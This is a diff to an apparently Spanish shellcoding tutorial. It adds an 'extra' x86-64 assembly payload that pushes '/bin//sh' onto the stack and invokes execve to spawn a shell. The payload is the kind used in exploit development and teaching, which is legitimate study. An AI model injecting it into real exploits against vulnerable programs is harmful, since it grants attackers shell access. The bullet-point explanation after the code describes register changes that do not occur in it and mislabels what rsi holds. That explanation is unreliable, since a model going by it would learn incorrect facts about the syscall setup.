@@ -84,4 +84,37 @@ cucuxii
 $ whoami
 cucuxii
 ```
+--------------------
 
+## Extra: Otra version que funciona
+
+```
+global _start 
+section .text
+
+_start:
+    xor rax, rax 
+    push rax                    ; Colocar NULL en la pila
+    mov rbx, 0x68732f2f6e69622f ; rbx = /bin//sh
+    push rbx                    ; Meter "/bin//sh" en la pila
+    mov rdi, rsp                ; Colocar la dirección de "/bin//sh" en rdi
+    
+    push rax                    ; Meter un 0x0 (NULL) en la pila
+    mov rdx, rsp                ; Colocar NULL en rdx
+    
+    push rdi                    ; Colocar puntero a "/bin//sh" en la pila
+    mov rsi, rsp                ; Meter el puntero en rsi
+    
+    add rax, 59                 ; Cargar el número de la llamada al sistema de execve en rax (59)
+    syscall                     ; Realizar la llamada al sistema
+```
+- mov rdi, rsp se ha cambiado a mov rsi, rsp. Ahora, la dirección de /bin//sh se carga en rsi en lugar de rdi.
+- mov rdx, rsp se ha cambiado a mov rax, rsp. Ahora, NULL se carga en rax en lugar de rdx.
+- mov rsi, rsp se ha cambiado a mov rdi, rsp. Ahora, la dirección de /bin//sh se carga en rdi en lugar de rsi.
+
+La razón por la que esto funciona es que la llamada al sistema execve toma los siguientes argumentos en los registros:
+
+- rax: El número de la llamada al sistema.
+- rdi: El primer argumento (en este caso, la dirección de la cadena /bin//sh).
+- rsi: El segundo argumento (en este caso, NULL).
+- rdx: El tercer argumento (en este caso, NULL).
